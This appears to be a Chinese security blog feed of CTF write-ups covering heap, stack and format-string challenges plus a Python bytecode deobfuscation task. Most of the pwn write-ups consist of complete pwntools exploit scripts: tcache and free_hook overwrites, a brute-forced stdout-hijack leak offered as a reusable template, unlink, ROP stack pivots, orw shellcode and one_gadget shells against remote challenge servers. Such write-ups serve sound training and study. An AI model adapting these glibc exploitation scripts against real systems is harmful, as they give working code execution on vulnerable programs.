shellcode = shellcode.ljust(0x24,'\\x00') gadgets = asm('sub esp,0x28;jmp esp') print(gadgets) payload = shellcode + p32(jmp_esp) + gadgets # debug() sl(payload) itr() roarctf_2019_realloc_magic分析漏洞点 UAF 程序用realloc函数来分配堆块，因为不熟悉这个搞的我，好久没有做出来。 知识点realloc的特点基础功能是改变mem_address所指内存区域的大小为newsize长度。这里就有几种不同的情况 1.当size为0，这时就相当于free()函数，同时返回值为null 2.当指针为0，size大于0，相当于malloc函数 3.size小于等于原来的size，则在原先的基础上缩小，多余的堆块free掉 4.size大于原来的size，如果有足够空间就原基础扩充，空间不足则分配新的内存，并将原来指针指向的堆块旧内容复制到新的堆块内存中，然后再将原来的堆块free掉。 其中第4点，有足够空间，画图解释一下： 由于这个特性，来制作3个堆块A、B、C，B堆块作为进入unsortbin的堆块存在，C是为了防止不让C合并top chunk，然后用A来申请一个size&lt;=（A的size + B的size）的堆块，这样就造成了堆块的重叠。 利用 _IO_2_1_stdout_ 来泄漏信息参考链接：http://pzhxbz.cn/?p=139 http://blog.eonew.cn/archives/1190 http://blog.eonew.cn/archives/1190 这个题因为有过输出，其_IO_CURRENTLY_PUTTING就是为1的 ，对于_IO_IS_APPENDING这个flag的值，将这个flag搞成1之后，就可以通过修改_IO_buf_base来完成leak。 在赛题中，很多程序都是用过输出函数进行输出的，基本就是改掉flag，中间的三个变量在输出的过程中都不怎么用得到，直接盖成0,低位覆盖_IO_buf_base为合适的值就可以完成leak。 Flag 怎么设置，在赛题中还是很随意的： 0xfbad1887 0xfbad3c80 重点就是让stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base 大体的利用方法就是利用unsorted bin的在tcache或fastbin的fd上留下main_arena的地址，由于_IO_2_1_stdout_与arena只相差4位，且低三位已知，在传入是低3位覆盖fd留下的main_arena的地址，剩余一位可以爆破，概率1/16,从而劫持stdout以达到泄露的目的 。 expfrom pwn import * import time local_file = './roarctf_2019_realloc_magic' elf = ELF(local_file) # context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',28690) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] rce18 = [0x4f2c5,0x4f322,0x10a38c] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('&gt;&gt;','1') sla('?',str(size)) if int(size) != 0 : sa('?',str(data)) def free(): sla('&gt;&gt;','2') def leak_addr(): add(0x80,'aaaaaaa') add(0,'') add(0x100,'aaaaaaaa') add(0,' ') add(0x110,' ') add(0,'') add(0x100,'a') for i in range(7): free() add(0,'1') add(0x80,'\\x60\\x87') payload = 17 * p64(0) + p64(0x61) + '\\x60\\x87' add(0x190,payload) add(0,'') add(0x100,'\\x60\\x87') add(0,'') payload = p64(0xfbad3c80) + '\\x00' * 8 * 3 + '\\x00' add(0x100,payload) leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(16) leak = u64(io.recv(8)) if leak == 0x320a6464412e310a: raise Exception('') break except Exception: io.close() # io = process('./roarctf_2019_realloc_magic') io = remote('node3.buuoj.cn',28690) continue leak = leak &gt;&gt; 16 info_addr('leak',leak) libc_base = leak - 4110208 info_addr('libc_base',libc_base) free_hook = 4118760 + libc_base sys_addr = 324832+libc_base sla('&gt;&gt;','666') add(0x120,'aaaaaaa') add(0,'') add(0x130,'aaaaaaaa') add(0,' ') add(0x160,' ') add(0,'') add(0x130,'a') for i in range(7): free() add(0,'1') add(0x120,'\\x60\\x87') payload = 37 * p64(0) + p64(0x71) + p64(free_hook) add(0x260,payload) add(0,'') add(0x130,'a') add(0,'') one_rec = rce18[1] +libc_base add(0x130,p64(one_rec)) free() # debug() itr() 其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。 ciscn_2019_en_3分析常规堆题，UAF，dup打free_hook_。上来用puts(&amp;s)，来泄漏栈上存在的libc地址。 expfrom pwn import * import time local_file = './ciscn_2019_en_3' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29542) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('ice','1') sla('size',str(size)) sa('story',str(data)) def free(idx): sla('ice','4') sla('dex',str(idx)) payload = 'a' * (0x20-8) sa('name',payload) sa('ID','chumen77') ru('chumen77') libc_base = uu64(r(6)) - 0x81237 info_addr('libc_base',libc_base) add(0x50,'aaaaaaaa') free(0) free(0) free_hook = libc_base + 0x3ed8e8 add(0x50,p64(free_hook)) add(0x50,p64(free_hook)) rec = rce18[1] + libc_base add(0x50,p64(rec)) free(0) itr() 极客大挑战2019 Not bad分析溢出0x18个字节，加上本身的栈长度，读orw 的shellcode内存不是很够用。需要迁移到mmap，进行orw。所以摆在栈上的shellcode就是，来一个read函数，把orw放在mmap上，然后再跳转上去执行即可。并且再次用到 jmp rsp + shellcode. expfrom pwn import * import time local_file = './bad' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29794) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() mmap = 0x123000 jmp_rsp = 0x0000000000400a01 # bss = 0x6010B0 - 0x20 orw = asm(shellcraft.open(\"./flag\")) orw += asm(shellcraft.read(3,\"rsp\",0x30)) orw += asm(shellcraft.write(1,\"rsp\",0x30)) payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm('mov rax,0x123300;call rax') payload = payload.ljust(0x28,'a') payload += p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp') sa('fun',payload) s(orw) itr() ciscn_2019_final_5分析Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 保护开的不多，分析和利用起来简单不少。 这个题难点就是在于发现漏洞点。 add函数__int64 result; // rax signed int i; // [rsp+4h] [rbp-1Ch] int size; // [rsp+8h] [rbp-18h] int idx; // [rsp+Ch] [rbp-14h] void *buf; // [rsp+10h] [rbp-10h] __int64 v5; // [rsp+18h] [rbp-8h] printf(\"index: \"); idx = read_int(); if ( idx &lt; 0 || idx &gt; 16 ) &#123; puts(\"index is invalid.\"); exit(-1); &#125; printf(\"size: \"); size = read_int(); if ( size &lt; 0 || size &gt; 0x1000 ) &#123; puts(\"size is invalid.\"); exit(-1); &#125; buf = malloc(size); if ( !buf ) &#123; puts(\"malloc error.\"); exit(-1); &#125; printf(\"content: \"); read(0, buf, size); show_diy((__int16)buf); 可以自定义输入堆的编号，最大可以17个，就感觉有点奇怪。然后以栈上的一个buf来存取分配heap的地址。 result = sub_400AB0((__int64)buf, idx); v5 = result; for ( i = 0; i &lt;= 16; ++i ) &#123; result = heaplist_idx[i]; if ( !result ) &#123; heaplist_idx[i] = v5; result = i; sizelist[i] = size; break; &#125; &#125; __int64 __fastcall sub_400AB0(__int64 a1, int a2) &#123; return a1 | a2; &#125; 可以看到以堆地址与堆的id进行以来一个| 运算。然后返回回来给v5，然后在存入bss的一段地址中。算是处理过的堆地址。 尝试研究一下，做完处理是什么样子： 先分配一个堆号为1 和 16的堆块，看下bss里面是存入了什么。 x/30gx 0x6020E0 0x6020e0: 0x0000000000e35270(16) 0x0000000000e35281(0) In [2]: hex(0x0e35260 | 16) Out[2]: '0xe35270' In [3]: hex(0x00e35281 | 0) Out[3]: '0xe35281' 差不多就是这样，但是也可以发现点异样。因为是| 的逻辑运算，在0-0xf是一个轮回后，到了16就又算是一个轮回。既然处理过堆地址，那肯定取出来进行操作时，肯定还会再进行处理回来。下面就是注意怎么处理的。 editfor ( i = 0; i &lt;= 16; ++i ) &#123; result = get_idx(heaplist_idx[i]); if ( result == idx ) &#123; printf(\"content: \"); read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]); result = puts(\"edit success.\\n\"); break; &#125; &#125; __int64 __fastcall get_idx(char a1) &#123; return a1 &amp; 0xF; &#125; 可以看到其是依次0-17编号对堆块进行遍历取出，再取出时会对其进行&amp; 0xf的操作来尝试获取堆块的编号。 来测试一下： In [5]: hex(0x00e35281 &amp; 0xf). #1号堆块的计算 Out[5]: '0x1' In [6]: hex(0x00e35270 &amp; 0xf) #16号堆块的计算 Out[6]: '0x0' 这就很明显有异样了，申请的是16号堆块其认为是0号堆块。所以申请16号的堆块，其可以用edit（0）来进行编辑16号堆块。 然后看其如何编辑的： read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]); 其是根据bss上存的处理过堆块地址进行一下&amp; 0xFFFFFFFFFFFFFFF0 来进行编辑的。对于上来就申请了一个16号的堆块，很容易知道其堆块的末3为应该是0x260，但是当时存入的是0x270，尝试进行一下&amp; 0xFFFFFFFFFFFFFFF0： In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0) Out[7]: '0xe35270' 发现并不是从0x260进行编辑，但是同样还是可以编辑同样的size，所以这就造成了溢出，并且是0x10个字节。 利用 释放2个tcache 堆块，并且利用0x10字节，改其中一个堆块的fd，改为free的got位置 申请堆块到free got处，改free 为 puts 构造出一个unsortbin的堆块，然后再申请一个堆块，就会在这个堆块上留下部分的libc地址，然后进行leak 算出system的地址，继续改free got 处为 system，然后free一个带有/bin/sh\\x00的堆块，即可拿到shell expfrom pwn import * import time local_file = './ciscn_final_5' elf = ELF(local_file) # context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27180) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('choice:','1') sla('dex',str(idx)) sla('size',str(size)) sa('content',str(data)) def free(idx): sla('choice:','2') sla('dex',str(idx)) def edit(idx,data): sla('choice:','3') sla('dex',str(idx)) sa('content',str(data)) add(16,0x18,'sasdasdas') add(1,0x30,'aaaaaaaa') add(2,0x30,'aaaaaaaa') free(2) free(1) edit(0,p64(0) + p64(0x121) + p64(0x000000000602010)) add(5,0x800,'aaaaaaaa') add(6,0x50,'aaaa') add(3,0x30,' ') free(5) add(7,0x90,' ') add(4,0x30,'aaaaaaaa' + p64(elf.plt['puts'])) free(7) r() libc_base = uu64(r(6)) - 0x3ec120 info_addr('libc_base',libc_base) edit(4,'aaaaaaaa' + p64(libc.sym['system'] + libc_base)) add(9,0x10,'/bin/sh\\x00') free(9) itr() 由于其确定堆块的特殊性，在申请堆块到free got时，因为其在0x000000000602018，但是在经过逻辑运算处理后，放入bss后，想要再进行操作就有点困难，所以申请到0x000000000602010 就OK了。 ciscn_2019_s_1分析保护： [*] '/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Add函数：最多可以申请33个堆，且问你堆的编号，并且根据这个编号作为索引上bss段来存储heap的地址。大小范围在0x7f - 0x100。 edit函数： v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0; 明显存在着off by null。且有key1控制着，只能编辑2次。 if ( key1 == 2 ) exit(0); Show函数：Key2有值才能用。 利用 由于没有开启pie保护，这样明显可以unlink攻击，申请一个32堆号的堆，大小0xf8，都是越大越好，为了上靠近key1、key2，然后进行控制. 剩下的就很简单了。 expfrom pwn import * import time local_file = './ciscn_s_1' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29756) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('show\\n','1') sla('dex',str(idx)) sla('size',str(size)) sa('content',str(data)) def free(idx): sla('show\\n','2') sla('dex',str(idx)) def edit(idx,data): sla('show\\n','3') sla('dex',str(idx)) sa('content',str(data)) def show(idx): sla('show\\n','4') sla('dex',str(idx)) key2 = 0x6022B8 for i in range(7): add(i,0xf8,'aaaaaaaa') add(7,0xf8,\"aaaa\")#8 payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30) add(32,0xf8,payload)#32 add(8,0x88,\"aaaa\") add(9,0xf8,\"aaaa\") add(10,0x88,'aaaa') for i in range(7): free(i+1) # 由于32的堆块申请后破坏了0号堆块的在bss上地址的储存 payload = 'a' * 0x80 + p64(0x180) edit(8,payload) free(9) payload = p64(0) * 3 + p64(0x00000000006021c8) + '\\x00' * (0xf0 - 0x8 * 4) + p64(0x0000000400000001) edit(32,payload) add(11,0x88,' ') show(11) r() libc_base = uu64(r(6)) - 0x3ebf20 info_addr('libc_base',libc_base) free_hook = libc_base + 0x3ed8e8 rec = rce18[1] + libc_base payload = p64(0) * 3 + p64(free_hook) edit(32,payload) edit(32,p64(rec)) free(11) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"“第五空间” 智能安全大赛-twice","slug":"“第五空间” 智能安全大赛","date":"2020-06-28T12:43:20.845Z","updated":"2020-07-31T04:17:47.701Z","comments":true,"path":"2020/06/28/“第五空间” 智能安全大赛/","link":"","permalink":"http://chumen77.xyz/2020/06/28/“第五空间” 智能安全大赛/","excerpt":"","text":"“第五空间” 智能安全大赛比赛时当天有考试，就做了个签道题。 twice查保护Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida分析 程序可以给你2次的读操作，第一次读89字节，第二次读112字节 栈大小是0x60，存在栈溢出。 0x7fffffffe3b0 --&gt; 0x6097ecbc62682200 0x7fffffffe3b8 --&gt; 0x6097ecbc62682200 0128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;: push r15) 0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;: test eax,eax) 0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;: push r15) 0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax) 0160| 0x7fffffffe3e0 --&gt; 0x1 0168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (\"/media/psf/mypwn/no5space/pwn\") 0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0 调试发现第一次read，可以leak canary 和一个栈地址，从而可以根据偏移算出栈上其他有用的地址。 第二次，需要填充一下canary，然后可以去攻击ret address 但是，并没有拿到libc的地址，是无法拿到shell。由于可以溢出的字节有限，也没法进行rop。 获取libc地址此时，根据前面泄漏的栈地址，可以算出read函数的buf栈地址，然后栈迁移上去，然后进行rop来leak 出libc地址。 拿到libc地址以后，rop的终结地址为程序的start。让其清理栈，再次进行程序的漏洞利用。 exp from pwn import * import time local_file = './pwn' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('121.36.59.116',9999) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() # debug() payload = \"1\" * 0x57 + 'a' sla(\"&gt;\",payload) ru('a') canary = uu64(r(8)) - 0x0a print(hex(canary)) s_base = uu64(r(6)) - 0x70 print(hex(s_base)) pop_rsi_pop_r15_ret = 0x0000000000400921 pop_rbp_ret = 0x0000000000400690 pop_rdi_ret = 0x0000000000400923 leave_ret = 0x0000000000400879 rop = flat([0,pop_rdi_ret,elf.got['__libc_start_main'],elf.plt['puts'],0x0400630]) payload = rop.ljust(0x50,'\\0') payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret) # debug() sa(\"&gt;\",payload) r(1) libc_base = uu64(r(6)) - libc.symbols['__libc_start_main'] info_addr('libc_base',libc_base) sla(\"&gt;\",'1') ru('1') rop = flat([0,pop_rdi_ret,elf.got['__libc_start_main'],elf.plt['puts'],0x0400630]) payload = rop.ljust(0x50,'\\0') payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1]) sla(\"&gt;\",payload) itr() 注意在第二次发送payload不要发出去换行符。 最后一次payload 中的rop什么的都是抄第一次的payload，只是把最后的ret address 改成 one gadget 。（只是填充字节用的）","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"DASCTF安恒月赛(6th)","slug":"DASCTF安恒月赛(6th)","date":"2020-06-27T14:27:37.170Z","updated":"2020-06-28T12:43:13.866Z","comments":true,"path":"2020/06/27/DASCTF安恒月赛(6th)/","link":"","permalink":"http://chumen77.xyz/2020/06/27/DASCTF安恒月赛(6th)/","excerpt":"","text":"DASCTF安恒月赛(6th)REpyCharm(pyc文件恢复)这个题基本参考https://www.52pojie.cn/thread-912103-1-1.html来做的。 加载pyc co_codeIn [1]: import dis,marshal In [2]: f=open('1.pyc') In [3]: f.read(4) Out[3]: '\\x03\\xf3\\r\\n' In [4]: f.read(4) Out[4]: 'jv\\xe7^' In [5]: code = marshal.load(f) In [6]: code.co_consts Out[6]: (-1, None, 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=', 'Are u ready?', 0, 32, 'a', '', 'great!waht u input is the flag u wanna get.', 'pity!') In [7]: code.co_varnames Out[7]: () In [8]: code.co_names Out[8]: ('base64', 'a', 'raw_input', 'flag', 'b64encode', 'c', 'list', 'd', 'range', 'i', 'join', 'ohh') In [9]: code.co_code Out[9]: \"q\\x03\\x00q\\x00\\x06d\\xffd\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x02\\x00Z\\x01\\x00e\\x02\\x00d\\x03\\x00\\x83\\x01\\x00Z\\x03\\x00e\\x00\\x00j\\x04\\x00e\\x03\\x00\\x83\\x01\\x00Z\\x05\\x00e\\x06\\x00e\\x05\\x00\\x83\\x01\\x00Z\\x07\\x00x'\\x00e\\x08\\x00d\\x04\\x00d\\x05\\x00\\x83\\x02\\x00D]\\x16\\x00Z\\t\\x00e\\x07\\x00e\\t\\x00c\\x02\\x00\\x19d\\x06\\x007\\x03&lt;qI\\x00Wd\\x07\\x00j\\n\\x00e\\x07\\x00\\x83\\x01\\x00Z\\x0b\\x00e\\x0b\\x00e\\x01\\x00k\\x02\\x00r\\x86\\x00d\\x08\\x00GHn\\x05\\x00d\\t\\x00GHd\\x01\\x00S\" 使用dis库对co_code进行反编译:In [10]: dis.dis(code.co_code) 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 1536 6 LOAD_CONST 25855 (25855) 9 STOP_CODE 10 STOP_CODE 11 LOAD_CONST 1 (1) 14 IMPORT_NAME 0 (0) 17 STORE_NAME 0 (0) 20 LOAD_CONST 2 (2) 23 STORE_NAME 1 (1) 26 LOAD_NAME 2 (2) 29 LOAD_CONST 3 (3) 32 CALL_FUNCTION 1 35 STORE_NAME 3 (3) 38 LOAD_NAME 0 (0) 41 LOAD_ATTR 4 (4) 44 LOAD_NAME 3 (3) 47 CALL_FUNCTION 1 50 STORE_NAME 5 (5) 53 LOAD_NAME 6 (6) 56 LOAD_NAME 5 (5) 59 CALL_FUNCTION 1 62 STORE_NAME 7 (7) 65 SETUP_LOOP 39 (to 107) 68 LOAD_NAME 8 (8) 71 LOAD_CONST 4 (4) 74 LOAD_CONST 5 (5) 77 CALL_FUNCTION 2 80 GET_ITER 81 FOR_ITER 22 (to 106) 84 STORE_NAME 9 (9) 87 LOAD_NAME 7 (7) 90 LOAD_NAME 9 (9) 93 DUP_TOPX 2 96 BINARY_SUBSCR 97 LOAD_CONST 6 (6) 100 INPLACE_ADD 101 ROT_THREE 102 STORE_SUBSCR 103 JUMP_ABSOLUTE 73 &gt;&gt; 106 POP_BLOCK &gt;&gt; 107 LOAD_CONST 7 (7) 110 LOAD_ATTR 10 (10) 113 LOAD_NAME 7 (7) 116 CALL_FUNCTION 1 119 STORE_NAME 11 (11) 122 LOAD_NAME 11 (11) 125 LOAD_NAME 1 (1) 128 COMPARE_OP 2 (==) 131 POP_JUMP_IF_FALSE 134 &gt;&gt; 134 LOAD_CONST 8 (8) 137 PRINT_ITEM 138 PRINT_NEWLINE 139 JUMP_FORWARD 5 (to 147) 142 LOAD_CONST 9 (9) 145 PRINT_ITEM 146 PRINT_NEWLINE &gt;&gt; 147 LOAD_CONST 1 (1) 150 RETURN_VALUE 这里面需要注意的就是开头的： 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 1536 6 LOAD_CONST 25855 (25855) 9 STOP_CODE 10 STOP_CODE 明显加入了混淆，怎么突然就停止了STOP_CODE。接着就是想办法去除这些混淆，和修正co_code长度，期望修改后的opcode首行为 0 LOAD_CONST 0(0) 1 LOAD_CONST 1(1) 其中这种二进制字节码对应的翻译结果： 0x64 操作为LOAD_CONST，用法举例：LOAD_CONST 1 HEX: 640100 0x71 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE 14 HEX: 710e00 0x65 操作为LOAD_NAME，用法举例：LOAD_NAME 1 HEX: 650100 所以寻找： 0 LOAD_CONST 0(0) 即为寻找HEX : 640000这个作为混淆字段结束。开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测： 0 JUMP_ABSOLUTE 3 ￼￼￼￼￼￼￼￼￼ 那很明显混淆字段就是： 然后用工具删除即可，其中0x97就是co_code In [12]: len(code.co_code) Out[12]: 151 In [13]: hex(151) Out[13]: '0x97' 所以去除这8个字节的混淆代码，然后修改co_code长度为0x8f。 还原后的pyc开头 反编译反编译方法就多种多样了，可以在线什么的，我使用的uncompyle6. uncompyle6 -o 1.py 1.pyc # uncompyle6 version 3.7.1 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37) # [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc- # Embedded file name: pyCharm.py # Compiled at: 2020-06-15 21:23:54 import base64 a = 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=' flag = raw_input('Are u ready?') c = base64.b64encode(flag) d = list(c) for i in range(0, 32): d[i] += 'a' ohh = ('').join(d) if ohh == a: print 'great!waht u input is the flag u wanna get.' else: print 'pity!'% 反编译后这题就十分简单了。 给的字符串把“a”，去除后解码base64即可。 easy_maze直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。然后丢vscode。直接路径就出来了。 jkkjjhjjkjjkkkuukukkuuhhhuukkk Md5一下即可。 T0p Gear题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在Strcmp。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。 pwnspringboard考点就是堆上的格式化字符串利用，挺简单的。 攻击思路 利用环境变量那条链，进行攻击ret address，修改为one gadget给了8次漏洞利用机会，还是很容易实现的。其中ret address，为__libc_start_main+xxx EXPfrom pwn import * import time local_file = './springboard' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # '../libc.so.6 context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('183.129.189.60',10029) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww']#,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() sla(\"input\",\"1\") sla(\"input\",\"2\") sla(\"input\",\"3\") sla(\"input\",\"%13$pAAAA%11$p\") sleep(0.1) ru(\"0x\") tag = int(r(12),16) - 0xe0 ru(\"AAAA0x\") libc_base = int(r(12),16) -0x21b97 info_addr(\"libc_base\",libc_base) key1 = hex(tag)[-4:] print(key1) payload = '%&#123;&#125;c%13$hn'.format(int(key1,16)) sla(\"input\",payload) sleep(5) rec = rce18[1] + libc_base key2 = hex(rec)[-4:] print(key2) payload = '%&#123;&#125;c%39$hn'.format(int(key2,16)) sla(\"input\",payload) sleep(5) key3 = int(hex(tag)[-2:],16) + 2 print(key3) payload = '%&#123;&#125;c%13$hhn'.format(key3) sla(\"input\",payload) sleep(5) key4 = hex(rec)[-6:-4] print(key4) payload = '%&#123;&#125;c%39$hhn'.format(int(key4,16)) sla(\"input\",payload) itr() # 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push r15) # 0008| 0x7fffffffe2f8 --&gt; 0x55554780 # 0016| 0x7fffffffe300 --&gt; 0x555555756010 (\"11111111aaaaaaaa1111111122222222\\n\") # 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00 # 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push r15) # 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 